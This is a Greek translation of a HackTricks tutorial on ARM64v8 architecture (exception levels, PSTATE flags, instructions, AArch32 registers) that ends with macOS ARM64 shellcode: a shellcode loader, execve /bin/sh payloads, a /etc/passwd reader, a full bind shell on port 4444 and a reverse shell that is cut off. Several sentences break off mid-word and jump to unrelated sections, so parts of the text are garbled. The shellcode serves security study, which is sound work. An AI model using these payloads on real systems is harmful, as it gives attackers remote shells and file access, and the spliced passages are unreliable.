# Εισαγωγή στο ARM64v8

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **Επίπεδα Εξαιρέσεων - EL (ARM64v8)**

Στην αρχιτεκτονική ARMv8, τα επίπεδα εκτέλεσης, γνωστά ως Επίπεδα Εξαιρέσεων (ELs), καθορίζουν το επίπεδο προνομιούχου και τις δυνατότητες του περιβάλλοντος εκτέλεσης. Υπάρχουν τέσσερα επίπεδα εξαιρέσεων, από το EL0 έως το EL3, το καθένα εξυπηρετώντας ένα διαφορετικό σκοπό:

1. **EL0 - Λειτουργία Χρήστη**:
* Αυτό είναι το επίπεδο με τις λιγότερες προνομιούχες δυνατότητες και χρησιμοποιείται για την εκτέλεση κανονικού κώδικα εφαρμογής.
* Οι εφαρμογές που εκτελούνται στο EL0 είναι απομονωμένες μεταξύ τους και από το λογισμικό του συστήματος, βελτιώνοντας την ασφάλεια και τη σταθερότητα.
2. **EL1 - Λειτουργικό Σύστημα Πυρήνα**:
* Οι περισσότεροι πυρήνες λειτουργικού συστήματος εκτελούνται σε αυτό το επίπεδο.
* Το EL1 έχει περισσότερες προνομιούχες δυνατότητες από το EL0 και μπορεί να έχει πρόσβαση σε πόρους του συστήματος, αλλά με κάποιους περιορισμούς για να διασφαλιστεί η ακεραιότητα του συστήματος.
3. **EL2 - Λειτουργία Hypervisor**:
* Αυτό το επίπεδο χρησιμοποιείται για εικονικοποίηση. Ένας υπερεπεξεργαστής που εκτελείται στο EL2 μπορεί να διαχειριστεί πολλά λειτουργικά συστήματα (καθένα στο δικό του EL1) που εκτελούνται στον ίδιο φυσικό υλικό.
* Το EL2 παρέχει δυνατότητες για απομόνωση και έλεγχο των εικονικοποιημένων περιβαλλόντων.
4. **EL3 - Λειτουργία Ασφαλούς Επιτήρησης**:
* Αυτό είναι το πιο προνομιούχο επίπεδο και χρησιμοποιείται συχνά για ασφαλή εκκίνηση και περιβάλλοντα εκτέλεσης που εμπιστεύονται.
* Το EL3 μπορεί να διαχειριστεί και να ελέγξει τις προσβάσεις μεταξύ ασφαλών και μη ασφαλών καταστάσεων (όπως ασφαλής εκκίνηση, αξιόπιστο λειτουργικό σύστημα κ.λπ.).

Η χρήση αυτών των επιπέδων επιτρέπει τη δομημένη και ασφαλή διαχείριση διαφο
### **PSTATE**

**PSTATE** περιέχει αρκετά στοιχεία διεργασίας που έχουν σειριοποιηθεί στον ορατό στο λειτουργικό σύστημα ειδικό καταχωρητή **`SPSR_ELx`**, όπου X είναι το επίπεδο άδειας της εξαίρεσης που προκαλέστηκε (αυτό επιτρέπει την ανάκτηση της κατάστασης της διεργασίας όταν ολοκληρωθεί η εξαίρεση).\
Αυτά είναι τα προσβάσιμα πεδία:

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Τα σημαία συνθήκης **`N`**, **`Z`**, **`C`** και **`V`**:
* **`N`** σημαίνει ότι η λειτουργία παρήγαγε αρνητικό αποτέλεσμα
* **`Z`** σημαίνει ότι η λειτουργία παρήγαγε μηδέν
* **`C`** σημαίνει ότι η λειτουργία μεταφέρθηκε
* **`V`** σημαίνει ότι η λειτουργία παρήγαγε υπερχείλιση με πρόσημο:
* Το άθροισμα δύο θετικών αριθμών παράγει αρνητικό αποτέλεσμα.
* Το άθροισμα δύο αρνητικών αριθμών παράγει θετικό αποτέλεσμα.
* Στην αφαίρεση, όταν ένα μεγάλο αρνητικό αριθμό αφαιρείται από ένα μικρότερο θετικό αριθμό (ή αντίστροφα), και το αποτέλεσμα δεν μπορεί να αναπαρασταθεί εντός της περιοχής του δοσμένου μεγέθους bit.

{% hint style="warning" %}
Όχι όλες οι εντολές ενημερώνουν αυτές τις σημαίες. Ορισμένες όπως **`CMP`** ή **`TST`** το κάνουν, και άλλες που έχουν κατάληξη s όπως **`ADDS`** το κάνουν επίσης.
{% endhint %}

* Η τρέχουσα σημαία πλάτους καταχωρητή (`nRW`): Εάν η σημαία έχει την τιμή 0, το πρόγραμμα θα εκτελεστεί στην κατάσταση εκτέλεσης AArch64 μόλις συνεχιστεί.
* Το τρέχον επίπεδο εξαίρεσης (**`EL`**): Ένα κανονικό πρόγραμμα που εκτελείται στο EL0 θα έχει την τιμή 0
* Η σημαία ενός βήματος (**`SS`**): Χρησιμοποιείται από αποσφαλματωτές για να κάνουν ένα μόνο βήμα θέτοντας τη σημαία SS σε 1 μέσω του **`SPSR_ELx`** μέσω μιας εξαίρεσης. Το πρόγραμμα θα εκτελέσει ένα βήμα και θα εκδώσει μια εξαίρεση μοναδικού βήματος.
* Η σημαία κατάστασης μη έγκυρης εξαίρεσης (**`IL`**): Χρησιμοποιείται για να σημειώσει όταν ένα προνομιούχο λογισμικό πραγματοποιεί μια μη έγκυρη μεταφορά επιπέδου εξαίρεσης, αυτή η σημαία ορίζεται σε 1 και ο επεξεργαστής προκαλεί μια παράνομη εξαίρεση κατάστασης.
* Οι σημαίες **`DAIF`**: Αυτές οι σημαίες επιτρέπουν σε ένα προνομιούχο πρόγραμμα να μάσκαρει εκκρεμείς εξωτερικές εξαιρέσεις.
* Εάν το **`A`** είναι 1, αυτό σημαίνει ότι θα προκληθούν **ασύγχρονες αποτυπώσεις**. Το **`I`** ρυθμίζεται για να ανταποκριθεί σε εξωτερικά υλικά **Αιτήματα Διακοπών** (IRQs). και το F σχετίζεται με τα **Αιτήματα Γρήγορης Διακοπής** (FIRs).
* Οι σημαίες επιλογής δεί
* **`bfm`**: **Μετακίνηση Μπιτ**, αυτές οι λειτουργίες **αντιγράφουν τα μπιτ `0...n`** από μια τιμή και τα τοποθετούν σε θέσεις **`m..m+n`**. Οι **`#s`** καθορίζουν τη θέση του **αριστερότερου μπιτ** και οι **`#r`** το **πλήθος περιστροφής δεξιά**.
* Μετακίνηση μπιτ: `BFM Xd, Xn, #r`
* Μετακίνηση μπιτ με πρόσημο: `SBFM Xd, Xn, #r, #s`
* Μετακίνηση μπιτ χωρίς πρόσημο: `UBFM Xd, Xn, #r, #s`
* **Εξαγωγή και Εισαγωγή Μπιτ**: Αντιγράφει ένα μπιτφιλντ από έναν επιθυμητό καταχωρητή και το αντιγράφει σε έναν άλλο καταχωρητή.
* **`BFI X1, X2, #3, #4`** Εισαγωγή 4 μπιτ από τον X2 από το 3ο μπιτ του X1
* **`BFXIL X1, X2, #3, #4`** Εξαγωγή από το 3ο μπιτ του X2 τέσσερα μπιτ και αντιγραφή τους στον X1
* **`SBFIZ X1, X2, #3, #4`** Επεκτείνει με πρόσημο τα 4 μπιτ από τον X2 και τα εισάγει στον X1 ξεκινώντας από τη θέση μπιτ 3 μηδενίζοντας τα δεξιά μπιτ
* **`SBFX X1, X2, #3, #4`** Εξάγει 4 μπιτ ξεκινώντας από το μπιτ 3 του X2, τα επεκτείνει με πρόσημο και τοποθετεί το αποτέλεσμα στον X1
* **`UBFIZ X1, X2, #3, #4`** Επεκτείνει με μηδενικά τα 4 μπιτ από τον X2 και τα εισάγει στον X1 ξεκινώντας από τη θέση μπιτ 3 μηδενίζοντας τα δεξιά μπιτ
* **`UBFX X1, X2, #3, #4`** Εξάγει 4 μπιτ ξεκινώντας από το μπιτ 3 του X2 και τοποθετεί το αποτέλεσμα με μηδενική επέκταση στον X1.
* **Επέκταση Προσήμου Σε X**: Επεκτείνει το πρόσημο (ή προσθέτει μόνο μηδενικά στη μη υπογραφόμενη έκδοση) μιας τιμής για να είναι δυνατή η εκτέλεση λειτουργιών με αυτήν:
* **`SXTB X1, W2`** Επεκτείνει το πρόσημο ενός byte **από το W2 στον X1** (`W2` είναι το μισό του `X2`) για να γεμίσει τα 64 bits
* **`SXTH X1, W2`** Επεκτείνει το πρόσημο ενός 16bit αριθμού **από το W2 στον X1** για να γεμίσει τα 64 bits
* **`SXTW X1, W2`** Επεκτείνει το πρόσημο ενός byte **από το W2 στον X1** για να γεμίσει τα 64 bits
* **`UXTB X1, W2`** Προσθέτει μηδενικά (μη υπογραφόμενο) σε ένα byte **από το W2 στον X1** για να γεμίσει τα 64 bits
* **`extr`:** Εξάγει μπιτ από ένα συγκεκριμένο **ζεύγος συνενωμένων καταχωρητών**.
* Παράδειγμα: `EXTR W3, W2, W1, #3` Αυτό θα **συνενώσει το W1+W2** και θα πάρει **από το μπιτ 3 του W2 μέχρι το μπιτ 3 του W1** και θα το αποθηκεύσει στο W3.
* **`bl`**: **Branch with link**, χρησιμοποιείται για να **καλέσει** μια **υπορουτίνα**. Αποθηκεύει τη **διεύθυνση επιστροφής στο `x30`**.
* Παράδειγμα: `bl myFunction` — Αυτό καλεί τη συνάρτηση `myFunction` και αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
* **`blr`**: **Branch with Link to Register**, χρησιμοποιείται για να **καλέσει** μια **υπορουτίνα** όπου ο στόχος **καθορίζεται** σε έναν **καταχωρητή**. Αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
* Παράδειγμα: `blr x1` — Αυτό καλεί τη συνάρτηση της οποίας η διεύθυνση βρίσκεται στον `x1` και αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
* **`ret`**: **Επιστροφή** από **υπορουτίνα**, συνήθως χρησιμοποιώντας τη διεύθυνση στο **`x30`**.
* Παράδειγμα: `ret` — Αυτό επιστρέφει από την τρέχουσα
### **Πρόλογος Συνάρτησης**

1. **Αποθήκευση του link register και του frame pointer στο stack**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; αποθήκευση του ζεύγους x29 και x30 στο stack και μείωση του stack pointer
```
{% endcode %}
2. **Ρύθμιση του νέου frame pointer**: `mov x29, sp` (ρυθμίζει το νέο frame pointer για την τρέχουσα συνάρτηση)
3. **Δέσμευση χώρου στο stack για τοπικές μεταβλητές** (αν χρειάζεται): `sub sp, sp, <size>` (όπου `<size>` είναι ο αριθμός των bytes που χρειάζονται)

### **Επίλογος Συνάρτησης**

1. **Αποδέσμευση των τοπικών μεταβλητών (αν έχουν δεσμευτεί)**: `add sp, sp, <size>`
2. **Επαναφορά του link register και του frame pointer**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Επιστροφή**: `ret` (επιστρέφει τον έλεγχο στον καλούντα χρησιμοποιώντας τη διεύθυνση στον επαναφορτωτή συνδέσμου)

## Κατάσταση Εκτέλεσης AARCH32

Το Armv8-A υποστηρίζει την εκτέλεση προγραμμάτων 32-bit. Το **AArch32** μπορεί να εκτελεστεί με ένα από τα **δύο σύνολα εντολών**: **`A32`** και **`T32`** και μπορεί να αλλάξει μεταξύ τους μέσω του **`interworking`**.\
Τα προνομιούχα 64-bit προγράμματα μπορούν να προγραμματίσουν την εκτέλεση προγραμμάτων 32-bit εκτελώντας μια μεταφορά επιπέδου εξαίρεσης στο χαμηλότερο προνομιούχο 32-bit.\
Να σημειωθεί ότι η μετάβαση από 64-bit σε 32-bit γίνεται με ένα χαμηλότερο επίπεδο εξαίρεσης (για παράδειγμα ένα 64-bit πρόγραμμα στο EL1 προκαλεί ένα πρόγραμμα στο EL0). Αυτό γίνεται θέτοντας το **bit 4 του** **`SPSR_ELx`** ειδικού μητρώου **σε 1** όταν η διεργασία `AArch32` είναι έτοιμη για εκτέλεση και το υπόλοιπο του `SPSR_ELx` αποθηκεύει τα προγράμματα **`AArch32`** CPSR. Στη συνέχεια, η προνομιούχα διεργασία καλεί την εντολή **`ERET`** ώστε ο επεξεργαστής να μεταβεί σε **`AArch32`** εισέρχοντας σε A32 ή T32 ανάλογα με το CPSR**.**

Το **`interworking`** γίνεται χρησιμοποιώντας τα bits J και T του CPSR. `J=0` και `T=0` σημαίνει **`A32`** και `J=0` και `T=1` σημαίνει **T32**. Αυτό βασικά σημαίνει ότι θέτουμε το **χαμηλότερο bit σε 1** για να υποδείξουμε ότι το σύνολο εντολών είναι T32.\
Αυτό ορίζεται κατά τις **εντολές κλάδου μεταβίβασης interworking,** αλλά μπορεί επίσης να οριστεί απευθείας με άλλες εντολές όταν το PC ορίζεται ως το μητρώο προορισμού. Παράδειγμα:

Ένα άλλο παράδειγμα:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Καταχωρητές

Υπάρχουν 16 καταχωρητές 32-bit (r0-r15). Από τον r0 έως τον r14 μπορούν να χρησιμοποιηθούν για οποιαδήποτε λειτουργία, αλλά κάποιοι από αυτούς συνήθως είναι καταχωρημένοι:

- **`r15`**: Δείκτης προγράμματος (πάντα). Περιέχει τη διεύθυνση της επόμενης εντολής. Στο A32, το τρέχον + 8, στο T32, το τρέχον + 4.
- **`r11`**: Δείκτης καρέ
- **`r12`**: Καταχωρητής εσωτερικής κλήσης
- **`r13`**: Δείκτης στοίβας
- **`r14`**: Δείκτης σύνδεσης

Επιπλέον, οι καταχωρητές αντιγράφονται σε **`καταχωρημένους καταχωρητές`**. Αυτά είναι μέρη που αποθηκεύουν τις τιμές των καταχωρητών, επιτρέποντας την **ταχεία αλλαγή περιβάλλοντος** κατά την επεξεργασία εξαιρέσεων και προνομιούχων λειτουργιών για να αποφευχθεί η ανάγκη για χειροκίνητη αποθήκευση και επαναφορά των καταχωρητών κάθε φορά.\
Αυτό γίνεται αποθηκεύοντας την κατάσταση του επεξεργαστή από το **`CPSR`** στο **`SPSR`** της λειτουργίας του επεξεργαστή στην οποία γίνεται η εξαίρεση. Κατά την επιστροφή από την εξαίρεση, το **`CPSR`** αποκαθίσταται από το **`SPSR`**.

### CPSR - Τρέχων Κατάσταση Προγράμματος

Στο AArch32, το CPSR λειτουργεί παρόμοια με το **`PSTATE`** στο AArch64 και αποθηκεύεται επίσης στο **`SPSR_ELx`** όταν λαμβάνεται μια εξαίρεση για να αποκατασταθεί αργότερα η εκτέλεση:

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Τα πεδία χωρίζονται σε ομάδες:

- Καταχωρητής Κατάστασης Προγράμματος Εφαρμογής (APSR): Σημαίες αριθμητικών υπολογισμών και προσβάσιμες από το EL0
- Καταχωρητές Κατάστασης Εκτέλεσης: Συμπεριφορά διεργασίας (διαχειρίζονται από το λειτουργικό σύστημα).

#### Καταχωρητής Κατάστασης Προγράμματος Εφαρμογής (APSR)

- Οι σημαίες **`N`**, **`Z`**, **`C`**, **`V`** (όπως και στο AArch64)
- Η σημαία **`Q`**: Ορίζεται σε 1 όταν συμβαίνει **κορεσμός ακεραίων** κατά την εκτέλεση μιας εξειδικευμένης εντολής κορεσμού αριθμητικών υπολογισμών. Μόλις οριστεί σε **`1`**, θα διατηρήσει την τιμή μέχρι να οριστεί χειροκίνητα σε 0. Επιπλέον, δεν υπάρχει καμία εντολή που να ελέγχει την τιμή της ρητά, πρέπει να διαβαστεί χειροκίνητα.
- Οι σημαίες **`GE`** (Μεγαλύτερο ή ίσο) : Χρησιμοποιούνται σε λειτουργίες SIMD (Ενιαία Εντολή, Πολλαπλά Δεδομένα), όπως "παράλληλη πρόσθεση" και "παράλληλη αφαίρεση". Αυτές οι λειτουργίες επιτρέπουν την επεξεργασία πολλαπλών σημείων δεδομένων με μια μόνο εντολή.

Για παράδειγμα, η εντολή **`UADD8`** **προσθέτει τέσσερα ζεύγη bytes** (από δύο 32-bit τελεστέους) παράλληλα και αποθηκεύει τα αποτελέσματα σε έναν 32-bit καταχωρητή. Στη συνέχεια, **ορίζει τις σημαίες `GE` στο `APSR`** βάσει αυτών των αποτελεσμάτων. Κάθε σημαία GE αντιστοιχεί σε ένα από τα ζεύγη bytes πρόσθεσης, υποδεικνύοντας εάν η πρόσθεση για αυτό το ζεύγος bytes **υπερχείλισε**.

Η εντολή **`SEL`** χρησιμοποιεί αυτές τις σημαίες GE για να εκτελέσει συνθήκες ενεργειών.

#### Καταχωρητές Κατάστασης Εκτέλεσης

- Τα bits **`J`** και **`T`**: Το **`J`** πρέπει να είναι 0 και εάν το **`T`** είναι 0, χρησιμοποιείται το σύνολο εντολών A32, και εάν είναι 1, χρησιμοποιείται το T32.
- Κατάσταση Ομάδας IT Block (`ITSTATE`): Αυτά είναι τα bits από 10-15 και 25-26. Αποθηκεύουν συνθήκες για εντολές μέσα σε μια ομάδα με πρόθεμα **`IT`**.
- Το bit **`E`**: Υποδεικνύει την **τελειότητα**.
- Κομμάτια Κατάστασης Λειτουργίας και Μάσκας Εξαιρέσεων (0-4): Καθορίζουν την τρέχουσα κατάσταση εκτέλεσης. Το πέμπτο υποδεικνύει εάν το πρόγραμμα εκτελείται ως 32bit (1) ή 64bit (0). Τα άλλα 4 αντιπροσωπε
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
Μερικές φορές είναι πιο εύκολο να ελέγξετε τον **αποκωδικοποιημένο** κώδικα από το **`libsystem_kernel.dylib`** από το να ελέγξετε τον **πηγαίο κώδικα** επειδή ο κώδικας ορισμένων syscalls (BSD και Mach) δημιουργείται μέσω scripts (ελέγξτε τα σχόλια στον πηγαίο κώδικα), ενώ στο dylib μπορείτε να βρείτε τι καλείται.
{% endhint %}

### Shellcodes

Για να μεταγλωττίσετε:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Για να εξαγάγετε τα bytes:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Κώδικας C για να δοκιμάσετε το shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Κέλυφος

Παρμένο από [**εδώ**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) και εξηγείται.

{% tabs %}
{% tab title="με adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% tab title="με στοίβα" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### Διάβασμα με την εντολή cat

Ο στόχος είναι να εκτελεστεί η εντολή `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, οπότε το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (που στη μνήμη αυτό σημαίνει ένα σωρό από διευθύνσεις).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Εκτέλεση εντολής με τη χρήση του sh από ένα fork, έτσι ώστε η κύρια διεργασία να μην τερματιστεί

Για να εκτελέσετε μια εντολή χρησιμοποιώντας το sh από ένα fork, χωρίς να τερματιστεί η κύρια διεργασία, μπορείτε να ακολουθήσετε τα παρακάτω βήματα:

1. Χρησιμοποιήστε τη συνάρτηση fork() για να δημιουργήσετε ένα αντίγραφο της κύριας διεργασίας.
2. Στο παιδί που δημιουργήθηκε από το fork(), χρησιμοποιήστε τη συνάρτηση execl() για να εκτελέσετε την εντολή sh με την επιθυμητή εντολή ως όρισμα.
3. Χρησιμοποιήστε τη συνάρτηση wait() στην κύρια διεργασία για να περιμένετε το παιδί να ολοκληρώσει την εκτέλεση της εντολής.

Παρακάτω παρατίθεται ένα παράδειγμα κώδικα σε C για να εκτελέσετε μια εντολή με τη χρήση του sh από ένα fork:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid = fork();

    if (pid == 0) {
        // Παιδί
        execl("/bin/sh", "sh", "-c", "your_command_here", NULL);
        exit(0);
    } else if (pid > 0) {
        // Κύρια διεργασία
        wait(NULL);
    } else {
        // Σφάλμα κατά τη δημιουργία του fork
        printf("Fork failed\n");
        exit(1);
    }

    return 0;
}
```

Αντικαταστήστε την "your_command_here" με την εντολή που θέλετε να εκτελέσετε. Μετά την εκτέλεση του παραπάνω κώδικα, η εντολή θα εκτελεστεί με τη χρήση του sh από το παιδί που δημιουργήθηκε από το fork, ενώ η κύρια διεργασία θα περιμένει μέχρι να ολοκληρωθεί η εκτέλεση.
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Συνδεδεμένη κέλυφος (Bind shell)

Συνδεδεμένη κέλυφος από [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) στη **θύρα 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Αντίστροφη κέλυφος

Από [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell στο **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
